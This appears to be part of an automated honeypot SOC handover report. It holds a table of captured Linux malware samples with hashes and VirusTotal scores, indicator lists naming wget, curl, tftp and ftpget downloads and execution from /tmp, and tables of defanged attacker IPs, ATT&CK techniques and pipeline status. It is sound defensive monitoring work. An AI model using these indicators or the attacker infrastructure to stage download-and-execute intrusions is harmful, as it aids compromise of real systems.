| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **34/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 55/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `58.34.174[.]90` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 1 |
| `58.17.6[.]119` | CN | China Unicom Jiangxi province network | **100** ⚠️ | 50 |
| `102.110.7[.]160` | TN | OOREDOO TUNISIE SA | **100** ⚠️ | 15 |
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `36.74.222[.]124` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 1 |
| `65.20.138[.]3` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `65.20.133[.]56` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `66.132.195[.]117` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 129 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 116 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 14 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 14 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 14 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 166 cases |
| Tool 34  | Credential Extractor        | ✅ 144 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 88 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (10.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 116 priority case(s) shown individually · 20 recon entry/entries in table (8 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-23T19:25:21Z_
